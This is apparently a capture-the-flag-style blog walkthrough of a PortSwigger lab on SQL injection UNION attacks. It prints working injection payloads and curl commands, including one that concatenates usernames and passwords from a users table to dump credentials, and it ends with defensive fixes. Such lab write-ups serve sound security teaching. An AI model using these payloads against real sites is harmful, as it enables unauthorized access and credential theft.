---
title: "SQL injection UNION attack, retrieving multiple values in a single column"
date: 2026-06-29 09:00:00 -0500
categories: [PortSwigger, SQL Injection]
tags: [portswigger, cwe-89, sql-injection, union-attack, credential-dump]
description: "A product category filter is injectable, but the UNION query has only one string-typed column. Concatenating username and password into that single column dumps every credential and solves the lab."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: SQLi UNION Multiple Values Single Column
---

## Overview

This PortSwigger Web Security Academy lab has a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) vulnerability in the product category filter. The catch: the original query returns two columns, but only **one** of them is a string type. The technique is to concatenate multiple values — username and password — into that single usable column, dump every account, and log in as `administrator`.

## The technique

A `UNION SELECT` injection lets you append a second result set to the query's output, but it only works if your injected query has the **same number of columns** and the column you read from is **string-compatible**. Here there are two columns and only the second holds text. To exfiltrate both a username and a password through that one column, you concatenate them with a delimiter:

- Oracle / PostgreSQL: `a || '~' || b`
- MySQL: `CONCAT(a, '~', b)` (`||` is logical-OR in MySQL)
- MSSQL: `a + '~' + b`

`NULL` is placed in the non-string column because `NULL` is compatible with any column type — the universal placeholder for columns you don't need.

## Solution

First confirm the query has two columns and that the second is text — `abc` appears in the response:

```
GET /filter?category=Gifts' UNION SELECT NULL,'abc'-- -
```

As a copy-pasteable request:

```bash
curl -sk -G "https://TARGET/filter" \
  --data-urlencode "category=Gifts' UNION SELECT NULL,'abc'-- -"
```

Now dump every username and password as `user~pass` in that single string column:

```bash
curl -sk -G "https://TARGET/filter" \
  --data-urlencode "category=Gifts' UNION SELECT NULL,username||'~'||password FROM users-- -"
```

The response contains every row of the `users` table:

```
administrator~<redacted>
carlos~<redacted>
wiener~<redacted>
```

Log in as `administrator` with the recovered password. The lab status flips to **Solved**.

> Outside a teaching lab, `sqlmap` automates exactly this column juggling — `--union-cols` pins the column count and `--union-char` sets the filler value — so you rarely build the concat by hand in the field. Doing it manually once, though, makes the underlying mechanic obvious.
{: .prompt-tip }

## Why it worked

The application built the SQL query by concatenating the `category` parameter directly into the query string, so the parameter was treated as executable SQL rather than as data. That let the injected `UNION SELECT` run against the `users` table. Having only one string-typed column was no obstacle — concatenation collapses any number of values into a single returned field.

## Fix / defense

- **Use parameterized queries (prepared statements).** Bind `category` as a parameter so the database always treats it as data, never as part of the SQL statement. This removes the injection entirely.
- Do not rely on input filtering or escaping as the primary control — it is bypass-prone.
- Apply least privilege to the database account so a successful injection reads as little as possible.
